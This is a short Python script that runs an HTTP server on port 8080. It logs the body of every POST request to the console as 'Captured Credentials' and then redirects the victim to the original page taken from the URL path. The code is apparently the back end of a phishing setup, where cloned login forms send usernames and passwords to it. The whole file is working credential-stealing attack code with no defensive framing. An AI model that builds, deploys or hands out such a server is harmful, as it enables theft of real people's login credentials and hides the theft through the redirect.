from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import unquote

class CredRequestHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        creds = self.rfile.read(content_length).decode('utf-8')
        
        print("[+] Captured Credentials:\n", creds)

        # Extract redirect path (the original page)
        site = self.path[1:]

        # Respond with a redirect
        self.send_response(301)
        self.send_header('Location', unquote(site))
        self.end_headers()

if __name__ == "__main__":
    server_address = ('0.0.0.0', 8080)
    httpd = HTTPServer(server_address, CredRequestHandler)
    print(f"[*] Credential Logging Server started on port {server_address[1]}")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server interrupted by user. Exiting.")
        httpd.server_close()
